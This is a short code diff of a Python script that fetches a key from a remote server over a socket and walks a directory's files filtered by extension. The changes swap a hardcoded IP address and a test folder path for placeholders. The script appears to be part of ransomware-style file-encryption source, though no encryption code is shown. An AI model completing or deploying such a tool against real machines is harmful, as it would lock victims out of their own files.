@@ -11,7 +11,7 @@ import getpass
 
 #get key from server
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-IP_ADDRESS = '10.211.55.3'
+IP_ADDRESS = 'SERVER.IP.GOES.HERE'
 PORT = 9090
 client_socket.connect((IP_ADDRESS, PORT))
 key = client_socket.recv(1024)
@@ -36,7 +36,7 @@ EXTENSIONS = (
 )
 
 file_paths = []
-directory = r'C:\Users\drew\Documents\testing'
+directory = r'TEST/PATH/HERE'
 #f = open("paths/path.txt","w")
 for root, dirs, files in os.walk(directory):
     if any(s in root for s in EXCLUDED_DIRECTORIES):
